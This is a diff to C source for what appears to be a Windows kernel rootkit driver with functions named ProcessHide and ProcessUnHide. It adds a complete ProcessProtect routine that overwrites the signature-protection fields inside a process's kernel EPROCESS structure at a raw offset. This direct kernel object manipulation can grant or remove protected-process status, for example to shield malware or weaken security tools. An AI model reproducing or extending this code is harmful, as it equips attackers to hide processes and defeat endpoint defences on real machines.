@@ -11,7 +11,7 @@
  *      function status 
  */
 NTSTATUS ProcessHide(
-    IN ULONG Pid
+    _In_ ULONG Pid
 ) {
     PEPROCESS   EProcess       = NULL;
     NTSTATUS    NtStatus       = STATUS_UNSUCCESSFUL;
@@ -81,7 +81,7 @@ CLEANUP:
  *      status of function
  */
 NTSTATUS ProcessUnHide(
-    IN ULONG Pid
+    _In_ ULONG Pid
 ) {
     PEPROCESS   EProcess       = NULL;
     NTSTATUS    NtStatus       = STATUS_UNSUCCESSFUL;
@@ -134,6 +134,47 @@ CLEANUP:
 
     if ( EProcess ) {
         ObfDereferenceObject( EProcess );
+    }
+
+    return NtStatus;
+}
+
+/**
+ * @brief
+ *      Toggles process protection signature
+ *
+ * @param Protection
+ *      Protection arguments.
+ *      Contains process to protect/unprotect,
+ *      Signature level, signer, etc.
+ *
+ * @return
+ *      status of function
+ */
+NTSTATUS ProcessProtect(
+    _In_ PRS_C_PROCESS_PROTECTION Protection
+) {
+    PEPROCESS          Process         = NULL;
+    PPS_SIG_PROTECTION PsSigProtection = NULL;
+    NTSTATUS           NtStatus        = STATUS_UNSUCCESSFUL;
+    
+    /* get Process EPROCESS object by Pid */
+    if ( ! NT_SUCCESS( NtStatus = PsLookupProcessByProcessId( C_PTR( Protection->Pid ), &Process ) ) ) {
+        PRINTF( "PsLookupProcessByProcessId Failed: %p\n", NtStatus )
+        goto CLEANUP;
+    }
+
+    /* get pointer of process signature protection */
+    PsSigProtection = C_PTR( U_PTR( Process ) + Instance.Ofs.ProcessProtection );
+
+    /* apply protection */
+    PsSigProtection->SignatureLevel        = Protection->SignatureProtection.SignatureLevel;
+    PsSigProtection->SectionSignatureLevel = Protection->SignatureProtection.SectionSignatureLevel;
+    PsSigProtection->Protection            = Protection->SignatureProtection.Protection;
+    
+CLEANUP:
+    if ( Process ) {
+        ObDereferenceObject( Process );
     }
 
     return NtStatus;
